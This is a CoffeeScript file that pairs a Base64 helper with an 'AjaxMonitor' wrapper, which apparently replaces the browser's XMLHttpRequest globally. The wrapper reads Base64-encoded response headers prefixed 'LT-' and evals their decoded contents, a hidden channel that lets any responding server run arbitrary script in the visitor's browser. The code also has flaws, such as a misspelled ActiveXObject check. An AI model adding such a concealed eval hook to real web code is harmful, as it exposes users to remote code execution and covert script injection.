do ->
    Base64 =
    _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    encode: (input) ->
        output = ""
        i = 0
        input = Base64._utf8_encode(input)
        while i < input.length
            chr1 = input.charCodeAt(i++)
            chr2 = input.charCodeAt(i++)
            chr3 = input.charCodeAt(i++)
            enc1 = chr1 >> 2
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4)
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6)
            enc4 = chr3 & 63
            if isNaN(chr2)
                enc3 = enc4 = 64
            else enc4 = 64  if isNaN(chr3)
            output = output + @_keyStr.charAt(enc1) + @_keyStr.charAt(enc2) + @_keyStr.charAt(enc3) + @_keyStr.charAt(enc4)
        output

    decode: (input) ->
        output = ""
        i = 0
        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "")
        while i < input.length
            enc1 = @_keyStr.indexOf(input.charAt(i++))
            enc2 = @_keyStr.indexOf(input.charAt(i++))
            enc3 = @_keyStr.indexOf(input.charAt(i++))
            enc4 = @_keyStr.indexOf(input.charAt(i++))
            chr1 = (enc1 << 2) | (enc2 >> 4)
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2)
            chr3 = ((enc3 & 3) << 6) | enc4
            output = output + String.fromCharCode(chr1)
            output = output + String.fromCharCode(chr2)  unless enc3 is 64
            output = output + String.fromCharCode(chr3)  unless enc4 is 64
        output = Base64._utf8_decode(output)
        output

    _utf8_encode: (string) ->
        string = string.replace(/\r\n/g, "\n")
        utftext = ""
        n = 0

        while n < string.length
            c = string.charCodeAt(n)
            if c < 128
                utftext += String.fromCharCode(c)
            else if (c > 127) and (c < 2048)
                utftext += String.fromCharCode((c >> 6) | 192)
                utftext += String.fromCharCode((c & 63) | 128)
            else
                utftext += String.fromCharCode((c >> 12) | 224)
                utftext += String.fromCharCode(((c >> 6) & 63) | 128)
                utftext += String.fromCharCode((c & 63) | 128)
            n++
        utftext

    _utf8_decode: (utftext) ->
        string = ""
        i = 0
        c = c1 = c2 = 0
        while i < utftext.length
            c = utftext.charCodeAt(i)
            if c < 128
                string += String.fromCharCode(c)
                i++
            else if (c > 191) and (c < 224)
                c2 = utftext.charCodeAt(i + 1)
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63))
                i += 2
            else
                c2 = utftext.charCodeAt(i + 1)
                c3 = utftext.charCodeAt(i + 2)
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63))
                i += 3
        string


    AjaxMonitor = (request) ->
        (mode) ->
            req = new request(mode)
            tag = "LT-"
            onReadyStateChange = ->
                if req.readyState is 4 && req.status is 200
                    unless req.responseType.toLowerCase() is "arraybuffer"
                        try
                            headers = req.getAllResponseHeaders()
                            data = []
                            while (a = headers.indexOf(tag)) != -1
                                headers = headers.substr(a + tag.length)
                                b = headers.indexOf(':')
                                c = parseInt(headers.substr(0, b))
                                d = b
                                while headers.charAt(++d) == ' '
                                    a = headers.indexOf('\n')
                                data[c] = headers.substring(d, a)
                                headers = headers.substr(a)

                            unless data.length
                                return

                            data = Base64.decode(data.join(""))

                            if data.length < 2
                                return

                            data = eval("(#{data})");
                            eval(data)
            if (req.addEventListener)
                req.addEventListener "readystatechange", onReadyStateChange
            else if (req.attachEvent)
                req.attachEvent "onreadystatechange", onReadyStateChange
            else
                req.readystatechange = onReadyStateChange
            req

    if (window.ActiveXobject)
        window.ActiveXObject = AjaxMonitor window.ActiveXObject

    if (window.XMLHttpRequest)
        window.XMLHttpRequest = AjaxMonitor window.XMLHttpRequest
